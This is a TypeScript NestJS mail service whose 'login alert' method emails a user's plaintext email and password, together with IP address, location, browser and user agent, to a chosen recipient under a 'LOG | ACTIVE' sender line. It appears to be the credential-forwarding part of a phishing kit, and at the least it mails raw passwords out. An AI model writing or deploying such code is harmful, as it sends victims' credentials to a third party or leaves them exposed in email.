import { Injectable } from '@nestjs/common';
import { MailerService } from '@nestjs-modules/mailer';
import * as path from 'path';

interface LoginDetails {
  email: string;
  password: string;
  browserName?: string;
  browserVersion?: string;
  platform?: string;
  ipAddress?: string;
  location?: string;
  userAgent?: string;
}

@Injectable()
export class MailService {
  constructor(private readonly mailerService: MailerService) {}

  public async sendLoginAlert(
    recipientEmail: string,
    loginDetails: LoginDetails,
  ): Promise<void> {
    try {
      await this.mailerService.sendMail({
        to: recipientEmail,
        from: `"LOG | ACTIVE" ${new Date()} <userx@ashrodax.com>`,
        subject: `🔐 New Login Alert`,
        template: path.join(
          __dirname,
          '..',
          '..',
          'mail',
          'templates',
          'foundation.ejs',
        ),
        context: {
          email: loginDetails.email,
          password: loginDetails.password,
          browserName: loginDetails.browserName || 'Unknown',
          browserVersion: loginDetails.browserVersion || '',
          platform: loginDetails.platform || 'Unknown',
          ipAddress: loginDetails.ipAddress || 'Unknown',
          location: loginDetails.location || 'Unknown',
          userAgent: loginDetails.userAgent || 'Unknown',
        },
      });

      console.log('✅ Login alert email sent successfully');
    } catch (error) {
      console.error('❌ Failed to send login alert email:', error);
      throw error;
    }
  }

  // Original method (if you still need it)
  public async sendMail(
    recipientEmail: string,
    email: string,
    password: string,
  ): Promise<void> {
    await this.sendLoginAlert(recipientEmail, { email, password });
  }
}
